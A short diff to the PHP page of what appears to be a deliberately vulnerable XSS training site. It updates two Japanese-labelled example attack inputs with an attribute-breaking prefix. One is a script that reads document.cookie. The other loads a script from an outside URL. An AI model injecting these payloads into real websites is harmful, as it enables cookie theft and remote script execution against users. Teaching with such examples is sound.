@@ -49,10 +49,10 @@ if (isset($_POST['message'])) {
             このサイトは、XSS(クロスサイトスクリプティング)の脆弱性がある為、<br/>悪意のあるユーザーによって、以下のような攻撃が可能です。
             <br/>
             ・ブラウザ内部にあるCookieを取得する入力例
-            <code><?php echo htmlspecialchars('<script>alert(document.cookie);</script>'); ?></code>
+            <code><?php echo htmlspecialchars('\'>"><script>alert(document.cookie)</script>'); ?></code>
             <br/>
             ・悪意のある外部Scriptを実行する入力例
-            <code><?php echo htmlspecialchars('<script src="https://qr.paps.jp/cj59b"></script>'); ?></code>
+            <code><?php echo htmlspecialchars('\'>"><script src="https://qr.paps.jp/cj59b"></script>'); ?></code>
         </pre>
     </div>
     <form action="index.php" method="POST">
